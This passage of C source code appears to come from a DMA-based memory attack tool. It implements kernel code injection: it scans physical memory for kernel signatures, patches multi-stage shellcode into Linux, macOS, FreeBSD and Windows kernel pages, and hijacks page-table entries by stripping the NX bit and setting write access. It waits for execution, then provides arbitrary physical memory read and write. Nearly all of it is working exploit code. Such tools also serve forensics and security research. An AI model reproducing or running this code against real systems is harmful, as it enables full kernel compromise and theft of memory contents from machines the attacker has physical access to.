    if((ctxMain->cfg.qwAddrMax == 0) || (ctxMain->cfg.qwAddrMax > qwMaxMemoryAddress)) {
        ctxMain->cfg.qwAddrMax = qwMaxMemoryAddress - 1;
    }
    if(ctxMain->cfg.fVerbose) {
        KMD_PhysicalMemoryMapDisplay(ctxMain->phKMD);
    }
    return TRUE;
}

_Success_(return)
BOOL KMD_SetupStage3(_In_ DWORD dwPhysicalAddress, _In_ PBYTE pbStage3, _In_ DWORD cbStage3)
{
    //------------------------------------------------
    // 1: Set up kernel module shellcode (stage3)
    //------------------------------------------------
    if(dwPhysicalAddress == 0xffffffff) {
        printf("KMD: Failed. Stage2 shellcode error.\n");
        return FALSE;
    }
    if(ctxMain->cfg.fVerbose) {
        printf("INFO: PA KMD BASE:  0x%08x\n", dwPhysicalAddress);
    }
    LcWrite(ctxMain->hLC, dwPhysicalAddress + 0x1000ULL, cbStage3, pbStage3);
    ctxMain->phKMD = (PKMDHANDLE)LocalAlloc(LMEM_ZEROINIT, sizeof(KMDHANDLE));
    if(!ctxMain->phKMD) { return FALSE; }
    ctxMain->phKMD->pk = (PKMDDATA)ctxMain->phKMD->pbPageData;
    ctxMain->pk = ctxMain->phKMD->pk;
    ctxMain->phKMD->dwPageAddr32 = dwPhysicalAddress;
    LcRead(ctxMain->hLC, ctxMain->phKMD->dwPageAddr32, 4096, ctxMain->phKMD->pbPageData);
    //------------------------------------------------
    // 2: Retrieve physical memory range map and complete open action.
    //------------------------------------------------
    if(!KMD_GetPhysicalMemoryMap()) {
        printf("KMD: Failed. Failed to retrieve physical memory map.\n");
        KMDClose();
        return FALSE;
    }
    ctxMain->cfg.qwKMD = ctxMain->phKMD->dwPageAddr32;
    if(ctxMain->pk->MAGIC != KMDDATA_MAGIC) {
        ctxMain->pk->MAGIC = KMDDATA_MAGIC;
        LcWrite(ctxMain->hLC, ctxMain->phKMD->dwPageAddr32, sizeof(QWORD), ctxMain->phKMD->pbPageData);
    }
    return TRUE;
}

_Success_(return)
BOOL KMDReadMemory_DMABufferSized(_In_ QWORD qwAddress, _Out_ PBYTE pb, _In_ DWORD cb)
{
    BOOL result;
    if(!KMD_IsRangeInPhysicalMap(ctxMain->phKMD, qwAddress, cb) && !ctxMain->cfg.fForceRW) { return FALSE; }
    ctxMain->pk->_size = cb;
    ctxMain->pk->_address = qwAddress;
    result = KMD_SubmitCommand(KMD_CMD_VOID);
    if(!result) { return FALSE; }
    result = KMD_SubmitCommand(KMD_CMD_READ);
    if(!result) { return FALSE; }
    return (cb == DeviceReadDMA(ctxMain->pk->DMAAddrPhysical, cb, pb, NULL)) && ctxMain->pk->_result;
}

_Success_(return)
BOOL KMDWriteMemory_DMABufferSized(_In_ QWORD qwAddress, _In_ PBYTE pb, _In_ DWORD cb)
{
    BOOL result;
    if(!KMD_IsRangeInPhysicalMap(ctxMain->phKMD, qwAddress, cb) && !ctxMain->cfg.fForceRW) { return FALSE; }
    result = LcWrite(ctxMain->hLC, ctxMain->pk->DMAAddrPhysical, cb, pb);
    if(!result) { return FALSE; }
    ctxMain->pk->_size = cb;
    ctxMain->pk->_address = qwAddress;
    result = KMD_SubmitCommand( KMD_CMD_VOID);
    if(!result) { return FALSE; }
    return KMD_SubmitCommand(KMD_CMD_WRITE) && ctxMain->pk->_result;
}

_Success_(return)
BOOL KMDReadMemory(_In_ QWORD qwAddress, _Out_ PBYTE pb, _In_ DWORD cb)
{
    DWORD dwDMABufferSize = (DWORD)ctxMain->pk->DMASizeBuffer;
    DWORD o = cb;
    dwDMABufferSize = dwDMABufferSize ? dwDMABufferSize : 0x01000000;
    while(TRUE) {
        if(o <= dwDMABufferSize) {
            return KMDReadMemory_DMABufferSized(qwAddress + cb - o, pb + cb - o, o);
        } else if(!KMDReadMemory_DMABufferSized(qwAddress + cb - o, pb + cb - o, dwDMABufferSize)) {
            return FALSE;
        }
        o -= dwDMABufferSize;
    }
}

_Success_(return)
BOOL KMDWriteMemory(_In_ QWORD qwAddress, _In_ PBYTE pb, _In_ DWORD cb)
{
    DWORD dwDMABufferSize = (DWORD)ctxMain->pk->DMASizeBuffer;
    DWORD o = cb;
    dwDMABufferSize = dwDMABufferSize ? dwDMABufferSize : 0x01000000;
    while(TRUE) {
        if(o <= dwDMABufferSize) {
            return KMDWriteMemory_DMABufferSized(qwAddress + cb - o, pb + cb - o, o);
        } else if(!KMDWriteMemory_DMABufferSized(qwAddress + cb - o, pb + cb - o, dwDMABufferSize)) {
            return FALSE;
        }
        o -= dwDMABufferSize;
    }
}

VOID KMDUnload()
{
    if(ctxMain->phKMD) {
        KMD_SubmitCommand(KMD_CMD_TERMINATE);
        KMDClose();
    }
}

VOID KMDClose()
{
    if(ctxMain->phKMD) {
        LocalFree(ctxMain->phKMD->pPhysicalMap);
        LocalFree(ctxMain->phKMD);
        ctxMain->phKMD = NULL;
        ctxMain->pk = NULL;
    }
}

_Success_(return)
BOOL KMDOpen_MemoryScan()
{
    PSIGNATURE pSignature, pSignatures = NULL;
    DWORD dwSignatureMatchIdx, cSignatures = CONFIG_MAX_SIGNATURES;
    KMDHANDLE_S12 h1, h2;
    PDWORD pdwPhysicalAddress;
    BOOL result;
    pSignatures = LocalAlloc(LMEM_ZEROINIT, CONFIG_MAX_SIGNATURES * sizeof(SIGNATURE));
    if(!pSignatures) { goto fail; }
    //------------------------------------------------
    // 1: Load signature
    //------------------------------------------------
    if(0 == _stricmp(ctxMain->cfg.szKMDName, "LINUX_X64_46")) {
        if(!KMD_Linux46KernelSeekSignature(&pSignatures[0])) {
            printf("KMD: Failed. Error locating generic linux kernel signature.\n");
            goto fail;
        }
        pSignature = &pSignatures[0];
    } else if(0 == _stricmp(ctxMain->cfg.szKMDName, "LINUX_X64_48")) {
        if(!KMD_Linux48KernelSeekSignature(&pSignatures[0])) {
            printf("KMD: Failed. Error locating generic linux kernel signature.\n");
            goto fail;
        }
        pSignature = &pSignatures[0];
    } else if((0 == _stricmp(ctxMain->cfg.szKMDName, "MACOS")) || (0 == _stricmp(ctxMain->cfg.szKMDName, "OSX_X64"))) {
        if(!KMD_MacOSKernelSeekSignature(&pSignatures[0])) {
            printf("KMD: Failed. Error locating generic macOS kernel signature.\n");
            goto fail;
        }
        pSignature = &pSignatures[0];
    } else if(0 == _stricmp(ctxMain->cfg.szKMDName, "FREEBSD_X64")) {
        if(!KMD_FreeBSDKernelSeekSignature(&pSignatures[0])) {
            printf("KMD: Failed. Error locating generic FreeBSD kernel signature.\n");
            goto fail;
        }
        pSignature = &pSignatures[0];
    } else {
        if(!Util_LoadSignatures(ctxMain->cfg.szKMDName, ".kmd", pSignatures, &cSignatures, 5)) {
            printf("KMD: Failed. Error loading signatures.\n");
            goto fail;
        }
        //------------------------------------------------
        // 2: Locate patch location (scan memory).
        //------------------------------------------------
        if(!KMD_FindSignature1(pSignatures, cSignatures, &dwSignatureMatchIdx)) {
            printf("KMD: Failed. Could not find signature in memory.\n");
            goto fail;
        }
        pSignature = &pSignatures[dwSignatureMatchIdx];
    }
    if(!pSignature->chunk[2].cb || !pSignature->chunk[3].cb) {
        printf("KMD: Failed. Error loading shellcode.\n");
        goto fail;
    }
    //------------------------------------------------
    // 3: Set up patch data.
    //------------------------------------------------
    h1.qwPageAddr = pSignature->chunk[0].qwAddress;
    h2.qwPageAddr = pSignature->chunk[1].qwAddress;
    h1.dwPageOffset = 0xfff & pSignature->chunk[2].cbOffset;
    h2.dwPageOffset = 0xfff & pSignature->chunk[3].cbOffset;
    DeviceReadDMA_Retry(ctxMain->hLC, h1.qwPageAddr, 4096, h1.pbOrig);
    DeviceReadDMA_Retry(ctxMain->hLC, h2.qwPageAddr, 4096, h2.pbOrig);
    memcpy(h1.pbPatch, h1.pbOrig, 4096);
    memcpy(h2.pbPatch, h2.pbOrig, 4096);
    memcpy(h1.pbPatch + h1.dwPageOffset, pSignature->chunk[2].pb, pSignature->chunk[2].cb);
    memcpy(h2.pbPatch + h2.dwPageOffset, pSignature->chunk[3].pb, pSignature->chunk[3].cb);
    // patch jump offset in stage1
    *(PDWORD)(h1.pbPatch + h1.dwPageOffset + STAGE1_OFFSET_CALL_ADD) += pSignature->chunk[3].cbOffset - pSignature->chunk[2].cbOffset;
    // patch original stage1 data in stage2 (needed for stage1 restore)
    memcpy(h2.pbPatch + h2.dwPageOffset + STAGE2_OFFSET_FN_STAGE1_ORIG, h1.pbOrig + h1.dwPageOffset, 8);
    // patch offset to extra function relative to stage2 entry point: windows = n/a, linux=kallsyms_lookup_name, mac=kernel_mach-o_header
    *(PDWORD)(h2.pbPatch + h2.dwPageOffset + STAGE2_OFFSET_EXTRADATA1) = pSignature->chunk[4].cbOffset - pSignature->chunk[3].cbOffset;
    //------------------------------------------------
    // 4: Write patched data to memory.
    //------------------------------------------------
    if(!DeviceWriteDMA_Verify(ctxMain->hLC, h2.qwPageAddr, 4096, h2.pbPatch)) {
        printf("KMD: Failed. Signature found but unable write #2.\n");
        goto fail;
    }
    if(!LcWrite(ctxMain->hLC, h1.qwPageAddr, 4096, h1.pbPatch)) { // stage1 (must be written after stage2)
        printf("KMD: Failed. Signature found but unable write #1.\n");
        goto fail;
    }
    printf("KMD: Code inserted into the kernel - Waiting to receive execution.\n");
    //------------------------------------------------
    // 5: wait for patch to reveive execution.
    //------------------------------------------------
    pdwPhysicalAddress = (PDWORD)(h2.pbLatest + h2.dwPageOffset + STAGE2_OFFSET_STAGE3_PHYSADDR);
    do {
        Sleep(100);
        if(!DeviceReadDMA_Retry(ctxMain->hLC, h2.qwPageAddr, 4096, h2.pbLatest)) {
            printf("KMD: Failed. DMA Read failed while waiting to receive physical address.\n");
            goto fail;
        }
    } while(!*pdwPhysicalAddress);
    printf("KMD: Execution received - continuing ...\n");
    //------------------------------------------------
    // 6: Restore hooks to original.
    //------------------------------------------------
    LcWrite(ctxMain->hLC, h2.qwPageAddr, 4096, h2.pbOrig);
    //------------------------------------------------
    // 7: Set up kernel module shellcode (stage3) and finish.
    //------------------------------------------------
    result = KMD_SetupStage3(*pdwPhysicalAddress, pSignature->chunk[4].pb, 4096);
    return result;
fail:
    return FALSE;
}

_Success_(return)
BOOL KMDOpen_PageTableHijack()
{
    QWORD qwCR3 = ctxMain->cfg.qwCR3;
    QWORD qwModuleBase;
    PSIGNATURE pSignature, pSignatures = NULL;
    DWORD cSignatures = CONFIG_MAX_SIGNATURES;
    KMDHANDLE_S12 h1, h2;
    PSIGNATUREPTE pSignaturePTEs;
    QWORD cSignaturePTEs;
    PDWORD pdwPhysicalAddress;
    BOOL result;
    pSignatures = LocalAlloc(LMEM_ZEROINIT, CONFIG_MAX_SIGNATURES * sizeof(SIGNATURE));
    if(!pSignatures) { goto fail; }
    //------------------------------------------------
    // 1: Load signature and patch data.
    //------------------------------------------------
    result = Util_LoadSignatures(ctxMain->cfg.szKMDName, ".kmd", pSignatures, &cSignatures, 6);
    if(!result) {
        printf("KMD: Failed. Error loading signatures.\n");
        goto fail;
    }
    if(cSignatures != 1) {
        printf("KMD: Failed. Singature count differs from 1. Exactly one signature must be loaded.\n");
        goto fail;
    }
    pSignature = &pSignatures[0];
    if(pSignature->chunk[0].cb != 4096 || pSignature->chunk[1].cb != 4096) {
        printf("KMD: Failed. Signatures in PTE mode must be 4096 bytes long.\n");
        goto fail;
    }
    pSignaturePTEs = (PSIGNATUREPTE)pSignature->chunk[5].pb;
    cSignaturePTEs = pSignature->chunk[5].cb / sizeof(SIGNATUREPTE);
    //------------------------------------------------
    // 2: Locate patch location PTEs.
    //------------------------------------------------
    if(ctxMain->cfg.fPageTableScan) {
        printf("KMD: Searching for PTE location ...\n");
    }
    result = Util_PageTable_FindSignatureBase(&qwCR3, pSignaturePTEs, cSignaturePTEs, &qwModuleBase);
    if(!result) {
        printf("KMD: Failed. Could not find module base by PTE search.\n");
        goto fail;
    }
    result = Util_PageTable_ReadPTE(qwCR3, qwModuleBase + pSignature->chunk[2].cbOffset, &h1.qwPTEOrig, &h1.qwPTEAddrPhys);
    if(!result) {
        printf("KMD: Failed. Could not access PTE #1.\n");
        goto fail;
    }
    result = Util_PageTable_ReadPTE(qwCR3, qwModuleBase + pSignature->chunk[3].cbOffset, &h2.qwPTEOrig, &h2.qwPTEAddrPhys);
    if(!result) {
        printf("KMD: Failed. Could not access PTE #2.\n");
        goto fail;
    }
    //------------------------------------------------
    // 3: Set up patch data.
    //------------------------------------------------
    // hijack "random" page in memory if target page is above 4GB - dangerous!!!
    h1.qwPageAddr = (h1.qwPTEOrig < 0x100000000) ? (h1.qwPTEOrig & 0xfffff000) : 0x90000;
    h2.qwPageAddr = (h2.qwPTEOrig < 0x100000000) ? (h2.qwPTEOrig & 0xfffff000) : 0x91000;
    h1.dwPageOffset = 0xfff & pSignature->chunk[2].cbOffset;
    h2.dwPageOffset = 0xfff & pSignature->chunk[3].cbOffset;
    memcpy(h1.pbPatch, pSignature->chunk[0].pb, 4096);
    memcpy(h2.pbPatch, pSignature->chunk[1].pb, 4096);
    memcpy(h1.pbPatch + h1.dwPageOffset, pSignature->chunk[2].pb, pSignature->chunk[2].cb);
    memcpy(h2.pbPatch + h2.dwPageOffset, pSignature->chunk[3].pb, pSignature->chunk[3].cb);
    // patch jump offset in stage1
    *(PDWORD)(h1.pbPatch + h1.dwPageOffset + STAGE1_OFFSET_CALL_ADD) += pSignature->chunk[3].cbOffset - pSignature->chunk[2].cbOffset;
    // patch original stage1 data in stage2 (needed for stage1 restore)
    memcpy(h2.pbPatch + h2.dwPageOffset + STAGE2_OFFSET_FN_STAGE1_ORIG, pSignature->chunk[0].pb + h1.dwPageOffset, 8);
    // patch offset to extra function relative to stage2 entry point: windows = n/a, linux=kallsyms_lookup_name
    *(PDWORD)(h2.pbPatch + h2.dwPageOffset + STAGE2_OFFSET_EXTRADATA1) = pSignature->chunk[4].cbOffset - pSignature->chunk[3].cbOffset;
    // calculate new PTEs
    h1.qwPTE = 0x7ff0000000000fff & h1.qwPTEOrig; // Strip NX-bit and previous physical address
    h2.qwPTE = 0x7ff0000000000fff & h2.qwPTEOrig; // Strip NX-bit and previous physical address
    h1.qwPTE |= 0x00000002; // set write
    h2.qwPTE |= 0x00000002; // set write
    h1.qwPTE |= 0xfffff000 & h1.qwPageAddr;
    h2.qwPTE |= 0xfffff000 & h2.qwPageAddr;
    //------------------------------------------------
    // 4: Write patched data and PTEs to memory.
    //------------------------------------------------
    LcRead(ctxMain->hLC, h1.qwPageAddr, 4096, h1.pbOrig);
    LcRead(ctxMain->hLC, h2.qwPageAddr, 4096, h2.pbOrig);
    if(!DeviceWriteDMA_Verify(ctxMain->hLC, h2.qwPageAddr, 4096, h2.pbPatch) ||
        !DeviceWriteDMA_Verify(ctxMain->hLC, h1.qwPageAddr, 4096, h1.pbPatch)) {
        printf("KMD: Failed. Signature found but unable write.\n");
        goto fail;
    }
    LcWrite(ctxMain->hLC, h2.qwPTEAddrPhys, sizeof(QWORD), (PBYTE)&h2.qwPTE);
    Sleep(250);
    LcWrite(ctxMain->hLC, h1.qwPTEAddrPhys, sizeof(QWORD), (PBYTE)&h1.qwPTE);
    //------------------------------------------------
    // 5: wait for patch to reveive execution.
    //------------------------------------------------
    printf("KMD: Page Table hijacked - Waiting to receive execution.\n");
    pdwPhysicalAddress = (PDWORD)(h2.pbLatest + h2.dwPageOffset + STAGE2_OFFSET_STAGE3_PHYSADDR);
    do {
        Sleep(100);
        if(!DeviceReadDMA_Retry(ctxMain->hLC, h2.qwPageAddr, 4096, h2.pbLatest)) {
            printf("KMD: Failed. DMA Read failed while waiting to receive physical address.\n");
            goto fail;
        }
    } while(!*pdwPhysicalAddress);
    printf("KMD: Execution received - continuing ...\n");
    //------------------------------------------------
    // 6: Restore hijacked memory pages.
    //------------------------------------------------
    LcWrite(ctxMain->hLC, h1.qwPTEAddrPhys, sizeof(QWORD), (PBYTE)&h1.qwPTEOrig);
    LcWrite(ctxMain->hLC, h2.qwPTEAddrPhys, sizeof(QWORD), (PBYTE)&h2.qwPTEOrig);
    Sleep(100);
    LcWrite(ctxMain->hLC, h1.qwPageAddr, 4096, h1.pbOrig);
    LcWrite(ctxMain->hLC, h2.qwPageAddr, 4096, h2.pbOrig);
    //------------------------------------------------
    // 7: Set up kernel module shellcode (stage3) and finish.
    //------------------------------------------------
    result = KMD_SetupStage3(*pdwPhysicalAddress, pSignature->chunk[4].pb, 4096);
    return result;
fail:
    return FALSE;
}

_Success_(return)
BOOL KMD_SetupStage3_FromPartial()
{
    BYTE pb[4096];
    DWORD cb;
    if(ctxMain->pk->OperatingSystem == KMDDATA_OPERATING_SYSTEM_LINUX) {
        return
            Util_ParseHexFileBuiltin("DEFAULT_LINUX_X64_STAGE3", pb, 4096, &cb) &&
            KMD_SetupStage3(ctxMain->phKMD->dwPageAddr32, pb, 4096);
    } else {
        printf("KMD: Failed. Not a valid KMD @ address: 0x%08x\n", ctxMain->phKMD->dwPageAddr32);
        return FALSE;
    }
}

_Success_(return)
BOOL KMDOpen_LoadExisting()
{
    //------------------------------------------------
    // 1: Set up handle to existing shellcode
    //------------------------------------------------
    ctxMain->phKMD = (PKMDHANDLE)LocalAlloc(LMEM_ZEROINIT, sizeof(KMDHANDLE));
    if(!ctxMain->phKMD) { return FALSE; }
    ctxMain->phKMD->dwPageAddr32 = (DWORD)ctxMain->cfg.qwKMD;
    ctxMain->pk = ctxMain->phKMD->pk = (PKMDDATA)ctxMain->phKMD->pbPageData;
    if(!DeviceReadDMA_Retry(ctxMain->hLC, ctxMain->phKMD->dwPageAddr32, 4096, ctxMain->phKMD->pbPageData)) {
        printf("KMD: Failed. Read failed @ address: 0x%08x\n", ctxMain->phKMD->dwPageAddr32);
        goto fail;
    }
    if(ctxMain->phKMD->pk->MAGIC == KMDDATA_MAGIC_PARTIAL) {
        return KMD_SetupStage3_FromPartial();
    }
    if(ctxMain->phKMD->pk->MAGIC != KMDDATA_MAGIC) {
        printf("KMD: Failed. Not a valid KMD @ address: 0x%08x\n", ctxMain->phKMD->dwPageAddr32);
        goto fail;
    }
    //------------------------------------------------
    // 2: Retrieve physical memory range map and complete open action.
    //------------------------------------------------
    if(!KMD_GetPhysicalMemoryMap()) {
        printf("KMD: Failed. Failed to retrieve physical memory map.\n");
        goto fail;
    }
    return TRUE;
fail:
    KMDClose();
    return FALSE;
}

_Success_(return)
BOOL KMDOpen()
{
    if(ctxMain->cfg.qwKMD) {
        return KMDOpen_LoadExisting();
    } else if(ctxMain->cfg.qwCR3 || ctxMain->cfg.fPageTableScan) {
        return KMDOpen_PageTableHijack();
    } else if(0 == _stricmp(ctxMain->cfg.szKMDName, "WIN10_X64")) {
        return KMDOpen_HalHijack();
    } else if(0 == _stricmp(ctxMain->cfg.szKMDName, "WIN10_X64_2")) {
        return KMDOpen_WINX64_2_VMM();
    } else if(0 == _stricmp(ctxMain->cfg.szKMDName, "WIN10_X64_3")) {
        return KMDOpen_WINX64_3_VMM();
    } else if(0 == _stricmp(ctxMain->cfg.szKMDName, "LINUX_X64_EFI")) {
        return KMDOpen_LinuxEfiRuntimeServicesHijack();
    } else if(0 == _stricmp(ctxMain->cfg.szKMDName, "UEFI_EXIT_BOOT_SERVICES")) {
        return KMDOpen_UEFI(0xe8 /* ExitBootServices */);
    } else if(0 == _stricmp(ctxMain->cfg.szKMDName, "UEFI_SIGNAL_EVENT")) {
        return KMDOpen_UEFI(0x68 /* ??? */);
    } else {
        return KMDOpen_MemoryScan();
    }
}
